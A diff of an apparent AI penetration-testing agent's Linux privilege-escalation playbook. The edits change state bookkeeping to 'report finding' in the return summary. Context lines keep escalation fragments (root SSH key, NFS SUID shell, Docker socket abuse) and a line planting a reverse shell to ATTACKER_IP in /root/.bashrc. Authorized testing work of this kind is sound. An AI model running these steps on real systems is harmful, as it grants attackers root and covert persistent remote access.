@@ -52,10 +52,6 @@ When an engagement directory exists:
 - **Evidence** → save significant output to `engagement/evidence/` with
   descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).
 
-Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
-engagement state. The orchestrator maintains these files. Report all findings
-in your return summary.
-
 ## State Management
 
 Call `get_state_summary()` from the state-reader MCP server to read current
@@ -64,9 +60,7 @@ engagement state. Use it to:
 - Leverage existing credentials or access for this technique
 - Understand what's been tried and failed (check Blocked section)
 
-**Do NOT write engagement state.** When your work is complete, report all
-findings clearly in your return summary. The orchestrator parses your summary
-and records state changes. Your return summary must include:
+Your return summary must include:
 - New targets/hosts discovered (with ports and services)
 - New credentials or tokens found
 - Access gained or changed (user, privilege level, method)
@@ -224,7 +218,7 @@ ssh -i /tmp/privesc_key root@localhost
 - SSH key addition logged in auth.log when used
 - File modification timestamps updated — check with `stat`
 
-After success → update state.md, log finding, proceed to **Step 10: Escalation and Routing**.
+After success → report finding, proceed to **Step 10: Escalation and Routing**.
 
 ## Step 3: NFS no_root_squash
 
@@ -305,7 +299,7 @@ chmod 4755 /tmp/nfs/rootbash
 - Binary won't execute → share mounted with `noexec` (try script-based approach instead)
 - `Operation not permitted` on chmod → NFS has `root_squash` (default — not exploitable)
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 4: Docker Group Escape
 
@@ -373,7 +367,7 @@ curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/C
 - Image pull creates network activity
 - Mount operations visible in process listing
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 5: LXD/LXC Group Escape
 
@@ -436,7 +430,7 @@ lxc image delete privesc-img
 - Storage backend errors → try `lxd init` with `dir` backend
 - Image import fails → use `lxc-create -t download` for LXC (non-LXD)
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 6: Disk Group — Raw Device Access
 
@@ -506,7 +500,7 @@ debugfs -w /dev/sda1
 - Permission denied on device → disk group may not have read on this device
 - Only read access → extract credentials and crack, or look for SSH keys
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 7: Shared Library Hijacking
 
@@ -645,7 +639,7 @@ PERL5LIB=/tmp /usr/bin/root_script.pl
 - Broken libraries can crash system services
 - Constructor functions leave process traces
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 8: PATH Hijacking in Scripts and Services
 
@@ -704,7 +698,7 @@ ls -ld /usr/local/bin /usr/local/lib
 # Place binary in /usr/local/bin — will be found before /usr/bin in most PATH configs
 ```
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 9: Profile Script Injection
 
@@ -765,7 +759,7 @@ echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &' >> /root/.bashrc
 - System-wide profiles affect all users — more likely to be noticed
 - Use `zzz-` prefix to load last (after other profile.d scripts)
 
-After success → update state.md, log finding, proceed to **Step 10**.
+After success → report finding, proceed to **Step 10**.
 
 ## Step 10: Escalation and Routing
 
@@ -813,7 +807,7 @@ After successful privilege escalation:
    ```
 
 3. **Update engagement state** (if engagement directory exists):
-   - Add root credentials/access to state.md
+   - Report root credentials/access in return summary
    - Mark exploited vector as `[done]` in Vulns section
    - Log escalation path in Pivot Map
 
